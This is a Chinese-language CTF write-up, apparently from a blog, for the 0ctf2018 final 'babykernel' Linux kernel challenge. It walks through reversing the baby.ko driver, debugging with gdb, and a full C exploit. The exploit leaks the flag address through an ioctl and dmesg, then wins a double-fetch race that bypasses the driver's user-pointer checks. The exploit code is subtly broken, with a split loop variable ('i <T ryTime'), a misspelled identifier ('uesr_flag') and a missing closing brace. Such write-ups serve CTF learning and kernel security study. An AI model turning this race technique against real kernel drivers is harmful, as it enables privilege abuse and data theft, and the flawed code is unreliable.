---
title: 0ctf2018_final_babykernel
top: false
comment: false
lang: zh-CN
date: 2021-11-17 18:18:45
tags:
categories:
  - CTF
  - PWN
  - kernel pwn
  - wp
---

# 0ctf2018_final_babykernel

## 信息收集

### 文件

#### 源文件

```
baby.ko  core.cpio  start.sh  vmlinuz-4.15.0-22-generic
```

##### vmlinuz

```
$ file vmlinuz-4.15.0-22-generic 
vmlinuz-4.15.0-22-generic: Linux kernel x86 boot executable bzImage, version 4.15.0-22-generic (buildd@lcy01-amd64-010) #24~16.04.1-Ubuntu S, RO-rootFS, swap_dev 0x7, Normal VGA

$ strings vmlinuz-4.15.0-22-generic | grep gcc
4.15.0-22-generic (buildd@lcy01-amd64-010) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)) #24~16.04.1-Ubuntu SMP Fri May 18 09:46:31 UTC 2018
```

##### start.sh

```
$ cat start.sh 
qemu-system-x86_64 \
-m 256M -smp 2,cores=2,threads=1  \
-kernel ./vmlinuz-4.15.0-22-generic \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
-cpu qemu64 \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  -enable-kvm  \
```

#### 解包

```
mkdir core
cd core
mv ../core.cpio .
cpio -idmv < core.cpio
```

##### fs.sh

存在打包脚本`fs.sh`；

```shell
#!/bin/sh
find . | cpio -o --format=newc > ../core.cpio
```

##### init

查看`init`；

```shell
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
echo "flag{this_is_a_sample_flag}" > flag
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod baby.ko
chmod 777 /dev/baby
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
```

### ida

使用ida查看`baby.ko`；

#### struct attr

`shift+F9查看结构体`

```
00000000 attr            struc ; (sizeof=0x10, mappedto_3)
00000000 flag_str        dq ?
00000008 flag_len        dq ?
00000010 attr            ends
```

#### init_module

```c
__int64 __fastcall init_module(__int64 a1, __int64 a2)
{
  _fentry__(a1, a2);
  misc_register(&baby);
  return 0LL;
}
```

`init_module`初始化，并注册了模块`baby.ko`；

##### _fentry__

注意到有一个`_fentry__`的宏；

#### clean_module

```c
__int64 cleanup_module()
{
  return misc_deregister(&baby);
}
```

`clean_module`卸载了`baby.ko`；

#### baby_ioctl

```c
signed __int64 __fastcall baby_ioctl(__int64 a1, attr *a2)
{
  attr *v2; // rdx
  signed __int64 result; // rax
  int i; // [rsp-5Ch] [rbp-5Ch]
  attr *v5; // [rsp-58h] [rbp-58h]

  _fentry__(a1, a2);
  v5 = v2;
  if ( (_DWORD)a2 == 0x6666 )
  {
    printk("Your flag is at %px! But I don't think you know it's content\n", flag);
    result = 0LL;
  }
  else if ( (_DWORD)a2 == 0x1337
         && !_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))
         && !_chk_range_not_ok(
               v5->flag_str,
               SLODWORD(v5->flag_len),
               *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))
         && LODWORD(v5->flag_len) == strlen(flag) )
  {
    for ( i = 0; i < strlen(flag); ++i )
    {
      if ( *(_BYTE *)(v5->flag_str + i) != flag[i] )
        return 0x16LL;
    }
    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);
    result = 0LL;
  }
  else
  {
    result = 0xELL;
  }
  return result;
}
```

当`baby_ioctl`的`cmd`为`0x6666`时，驱动将打印出flag的加载地址；

当`baby_ioctl`的`cmd`为`0x1337`时，还需要满足三个额外条件，并且`v5`结构体中的`flag_str`成员等于硬编码的flag后才可以打印flag，这看起来似乎滑稽且不可能；

- `!_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))`
- `!_chk_range_not_ok(
                 v5->flag_str,
                 SLODWORD(v5->flag_len),
                 *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))`
- `LODWORD(v5->flag_len) == strlen(flag)`

##### SLODWORD

这是ida的一个宏；

```c
#define SLODWORD(x) SDWORDn(x,LOW_IND(x,int32))
#define SDWORDn(x, n)  (*((int64*)&(x)+n))

#define LAST_IND(x,part_type)    (sizeof(x)/sizeof(part_type) - 1)
#if defined(__BYTE_ORDER) && __BYTE_ORDER == __BIG_ENDIAN
#  define LOW_IND(x,part_type)   LAST_IND(x,part_type)
#  define HIGH_IND(x,part_type)  0
#else
#  define HIGH_IND(x,part_type)  LAST_IND(x,part_type)
#  define LOW_IND(x,part_type)   0    // 小端序
#endif
```

因此相当于：

```
SLODWORD(x) -> SDWORDn(x,LOW_IND(x,int64)) -> (*((int32*)&(x)+LOW_IND(x,int32))) -> *((int64*)&(x))
x = v5->flag_len
*((int64*)&(v5->flag_len)) -> *((int64*)&(v5+8))
```

#### _chk_range_not_ok

```c
bool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  bool v3; // cf
  unsigned __int64 v4; // rdi
  bool result; // al

  v3 = __CFADD__(a2, a1);
  v4 = a2 + a1;
  if ( v3 )
    result = 1;
  else
    result = a3 < v4;
  return result;
}
```

##### __CFADD__

注意到`__CFADD__`的宏，这是ida pro里定义的；

```c
#define __CFADD__(x, y) invalid_operation // Generate carry flag for (x+y)

// carry flag of addition (x+y)
template<class T, class U> int8 __CFADD__(T x, U y)
{
  int size = sizeof(T) > sizeof(U) ? sizeof(T) : sizeof(U);
  if ( size == 1 )
    return uint8(x) > uint8(x+y);
  if ( size == 2 )
    return uint16(x) > uint16(x+y);
  if ( size == 4 )
    return uint32(x) > uint32(x+y);
  return uint64(x) > uint64(x+y);
}
```

这个宏将a1，a2本来的两个有符号数转成无符号数相加，然后通过他们的CF标志位判断是否溢出（无符号）；

比如说x, y分别是两个`int`类型数据，那么`unsigned int`肯定在正数范围内能取到的值大于`signed int`，那么如果uint都溢出了，那么`signed int`相加必然溢出；

##### a3<a2+a1?

返回的`result`需要为`0`才满足条件判断`!_chk_range_not_ok`；

而代码中的`result = a3 < v4;`，其中`v4 = a1 + a2`，意味着`a3`需要比`a1 + a2`大才能通过检查；

#### flag

```
.data:0000000000000480 flag            dq offset aFlagThisWillBe
.data:0000000000000480                                         ; DATA XREF: baby_ioctl+2A↑r
.data:0000000000000480                                         ; baby_ioctl+DB↑r ...
.data:0000000000000480                                         ; "flag{THIS_WILL_BE_YOUR_FLAG_1234}"
```

可以看到flag被硬编码到驱动文件中；

## 漏洞利用

### 分析

有三个条件需要满足，一个个分析一下：

#### first judge

`!_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))`

已知`v2`是一个`attr`结构体，根据上面的分析，需要满足的是`v2 + 0x10 <= ((unsigned int)&current_task) + 4952`；

#### second judge

`!_chk_range_not_ok(
               v5->flag_str,
               SLODWORD(v5->flag_len),
               *(_QWORD *)(__readgsqword((unsigned int)&current_task) + 4952))`

`v5`和`v2`指向了同一个结构体，其中需要满足`v5->flag_str`+`SLODWORD(v5->flag_len) <= ((unsigned int)&current_task) + 4952) `；

即：

```
*v5 + *(v5+8) <= ((unsigned int)&current_task) + 4952)
```

#### third judge

`LODWORD(v5->flag_len) == strlen(flag)`

即用户输入结构体的`flag_len`要与`flag`长度匹配；

### 问题

#### &current_task+4952

那么关键的`((unsigned int)&current_task) + 4952)`是什么呢？

调试分析一下；

首先更改`init`，改成root权限；

```
# setsid cttyhack setuidgid 1000 sh
setsid cttyhack setuidgid 0 sh
```

打包后，启动；

```
./fs.sh
cd ..
./start.sh
```

查看模块加载的地址；

```
/ # id
uid=0(root) gid=0(root) groups=0(root)
/ # lsmod
baby 16384 0 - Live 0xffffffffc00ad000 (OE)
/ # 
```

gdb调试，并加入符号信息；

```
$ gdb ./vmlinuz-4.15.0-22-generic -q

pwndbg> add-symbol-file baby.ko 0xffffffffc00ad000
add symbol table from file "baby.ko" at
	.text_addr = 0xffffffffc00ad000
Reading symbols from baby.ko...(no debugging symbols found)...done.
pwndbg> b baby_ioctl
Breakpoint 1 at 0xffffffffc00ad020

```

记得把`init`的`root`权限改回去，然后再启动shell文件里加入调试选项；

```
qemu-system-x86_64 \
-m 256M -smp 2,cores=2,threads=1  \
-kernel ./vmlinuz-4.15.0-22-generic \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet" \
-cpu qemu64 \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  -enable-kvm  \
-s
```

使用target来连接；

```
target remote localhost:1234
```

开始调试后，看一下汇编代码，发现`&current_task+0x1358`被mov到了rdx，执行完该汇编代码后，查看rdx的值即可；

```
.text:000000000000006A loc_6A:                                 ; CODE XREF: baby_ioctl+28↑j
.text:000000000000006A                 cmp     dword ptr [rbp-64h], 1337h
.text:0000000000000071                 jnz     loc_1B6
.text:0000000000000077                 mov     rax, gs:current_task
.text:0000000000000080                 mov     [rbp-30h], rax
.text:0000000000000084                 mov     rax, [rbp-30h]
.text:0000000000000088                 mov     rdx, [rax+1358h]           # &current_task+0x1358 here
.text:000000000000008F                 mov     rax, [rbp-70h]
.text:0000000000000093                 mov     esi, 10h
.text:0000000000000098                 mov     rdi, rax
.text:000000000000009B                 call    __chk_range_not_ok
```

可以看到结果就是`0x7ffffffff000`，实际上，这里在判断：

- 数据的指针是否指向用户态？
- 结构体flag的指针是否指向用户态？
- 结构体flag长度是否等于硬编码的flag长度？

### pwn

`double-fecth`的使用：如果先**构造一个user_data**来**通过内核态的验证**（此时user_data还是在用户态的，只是把地址送进去了），然后起一个evil thread来**不断劫持用户态的user_data**结构体中的flag指针，使其指向真正的flag的位置。同时，不停的用ioctl发0x1337指令，使得指令流进入else if，进行条件判断。那么就能通过double fetch的条件竞争bypass内核对flag的验证，最后打印出真正的flag；

```c
// gcc -static exploit.c -lpthread -o exploit
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
 
int TryTime=1000;
unsigned long long flag_addr;       //target flag address
int finish=1;
 
struct attr{
    char *flag;
    size_t len;
};
 
 
void evil_thread_func(void *a){     // arg is the address of user_data struct
    printf("Evil thread hijack!\n");
    struct attr *s = a;
    while(finish){
        s->flag = flag_addr;        // change flag pointer to flag address
    }
 
};
 
 
int main(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
 
 
    char buf[201]={0};
    char user_flag[] = "flag{user_flag}";
 
 
    struct attr user_data;
    user_data.flag = user_flag;
    user_data.len = 33;
 
    int fd;
    fd = open("/dev/baby",0);   // open device
 
    int ret;
    ret = ioctl(fd,0x6666);     // send command 0x6666
    system("dmesg | grep flag > /tmp/target.txt");  // dmesg to get flag_addr 
 
    // read flag
    int file_fd = open("/tmp/target.txt",O_RDONLY);
    int id = read(file_fd,buf,200);
    close(file_fd);
 
    char *addr;
    addr = strstr(buf,"Your flag is at ");
    if(!addr){
        perror("error!");
        return -1;
    }
 
    addr += 0x10;
 
    flag_addr = strtoull(addr, addr + 16,16);    //hex string to unsigned long long，global value flag_addr is target flag address
    printf("[*]flag addr is : %p\n", flag_addr);
 
    pthread_t evil_thread;
    pthread_create(&evil_thread, NULL, evil_thread_func, &user_data);       //start a evil thread to change user_data, continiously changes user_flag pointer to target flag_addr for double-fetch
    
    // TryTime=1000
    for(int i = 0; i <T ryTime; i++){
        ret = ioctl(fd, 0x1337, &user_data);       // send command 0x1337
        user_data.flag = uesr_flag;                 // make sure user_data flag pointer point to user space for cheating
    }
    finish = 0;                                   
    pthread_join(evil_thread, NULL);
    close(fd);
    printf("The flag in Kernel is :\n");
    system("dmesg | grep flag");
    return 0;
```

可以看到flag已被打印出来：

```
[   18.598578] Looks like the flag is not a secret anymore. So here is it flag{THIS_WILL_BE_YOUR_FLAG_1234}
```

